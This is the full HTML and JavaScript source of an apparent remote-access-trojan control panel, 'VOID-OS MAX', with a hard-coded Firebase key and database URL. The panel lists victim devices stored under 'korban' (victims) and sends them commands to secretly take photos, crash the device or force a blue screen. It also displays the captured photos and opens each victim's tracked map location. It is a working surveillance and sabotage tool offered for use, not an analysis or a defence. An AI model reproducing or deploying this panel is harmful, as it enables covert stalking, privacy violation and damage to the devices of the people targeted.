<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VOID-OS | EAGLE MAX CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --neon: #ff00ea; --cyber: #00f2ff; --bg: #050505; --card: #121212; --danger: #ff4444; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
        #login-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-card { background: var(--card); border: 1px solid var(--neon); padding: 30px; border-radius: 15px; width: 280px; text-align: center; }
        input { background: transparent; border: 1px solid var(--neon); color: #fff; padding: 12px; width: 100%; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; text-align: center; }
        .btn-login { background: var(--neon); color: #000; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
        .header { text-align: center; padding: 25px; border-bottom: 2px solid var(--neon); background: #111; }
        .eagle-logo { width: 100px; filter: drop-shadow(0 0 10px var(--neon)); animation: float 3s infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        .container { padding: 20px; max-width: 1000px; margin: auto; display: grid; grid-template-columns: 1fr; gap: 20px; }
        @media(min-width: 768px) { .container { grid-template-columns: 320px 1fr; } }
        .card { background: var(--card); border: 1px solid #333; border-radius: 12px; padding: 20px; }
        .target-item { padding: 15px; border: 1px solid #222; margin-bottom: 10px; border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; background: #181818; }
        .target-item.active { border-color: var(--cyber); background: rgba(0, 242, 255, 0.1); }
        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .btn { padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 10px; }
        .btn-snap { background: var(--cyber); }
        .btn-track { background: #fff; }
        .btn-bsod { background: #0078d7; color: #fff; }
        .btn-crash { background: var(--danger); color: #fff; }
        #preview-img { width: 100%; border-radius: 8px; border: 1px solid var(--cyber); margin-top: 15px; display: none; }
        #log { background: #000; padding: 10px; border-radius: 5px; height: 80px; overflow-y: auto; font-family: monospace; font-size: 10px; color: #0f0; margin-top: 15px; }
    </style>
</head>
<body onload="checkAuth()">
    <div id="login-screen">
        <div class="login-card">
            <h2 style="color:var(--neon); margin-bottom:20px;">EAGLE LOGIN</h2>
            <input type="password" id="passkey" placeholder="SECRET ACCESS KEY">
            <button class="btn-login" onclick="login()">IGNITE SYSTEM</button>
        </div>
    </div>
    <div class="header">
        <img src="https://i.ibb.co/vz0q8gL/robot-eagle.png" class="eagle-logo">
        <h2 style="margin:5px 0; color:var(--neon); letter-spacing:3px;">VOID-OS MAX</h2>
        <div style="font-size:10px; opacity:0.5;">LEAD DEV: KALZ</div>
        <button onclick="wipe()" style="background:var(--danger); border:none; padding:5px; border-radius:4px; font-size:9px; color:#fff; cursor:pointer; margin-top:10px;">LOGOUT & WIPE</button>
    </div>
    <div class="container">
        <div class="card">
            <h4 style="color:var(--cyber);">📡 SATELLITE RADAR</h4>
            <div id="target-list">Scanning...</div>
        </div>
        <div class="card" id="control-panel" style="display:none;">
            <h3 id="target-id" style="margin:0; color:var(--neon);">NODE: NONE</h3>
            <div id="log">Link standby...</div>
            <div class="control-grid">
                <button class="btn btn-snap" onclick="send('TAKE')">📸 SNAP</button>
                <button class="btn btn-track" onclick="track()">🌍 TRACK</button>
                <button class="btn btn-bsod" onclick="send('BSOD')">🌀 BSOD</button>
                <button class="btn btn-crash" onclick="send('CRASH')">💀 CRASH</button>
            </div>
            <img id="preview-img" src="">
        </div>
    </div>
<script>
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config); const db = firebase.database();
    let activeNode = null; let activeMaps = "";
    function login() { if(document.getElementById('passkey').value === "Secret") { sessionStorage.setItem('auth', 'true'); location.reload(); } else { alert("WRONG KEY"); } }
    function checkAuth() { if(sessionStorage.getItem('auth')) document.getElementById('login-screen').style.display = 'none'; }
    db.ref('korban').on('value', snap => {
        let h = "";
        snap.forEach(c => { h += `<div class="target-item" id="n-${c.key}" onclick="select('${c.key}','${c.val().maps}')"><span>📍 NODE_${c.key.substring(1,7)}</span><span style="color:var(--cyber); font-size:10px;">LIVE</span></div>`; });
        document.getElementById('target-list').innerHTML = h || "Waiting...";
    });
    function select(id, maps) {
        activeNode = id; activeMaps = maps;
        document.querySelectorAll('.target-item').forEach(e => e.classList.remove('active'));
        document.getElementById('n-'+id).classList.add('active');
        document.getElementById('control-panel').style.display = 'block';
        document.getElementById('target-id').innerText = `NODE: ${id.substring(1,8)}`;
        db.ref('hasil_foto/'+id).on('value', f => { if(f.val()){ document.getElementById('preview-img').src = f.val().foto; document.getElementById('preview-img').style.display = 'block'; } });
    }
    function send(cmd) { if(activeNode) db.ref('commands/'+activeNode).set({action:cmd, t:Date.now()}); }
    function track() { if(activeMaps) window.open(activeMaps); }
    function wipe() { sessionStorage.clear(); location.reload(); }
</script>
</body>
</html>
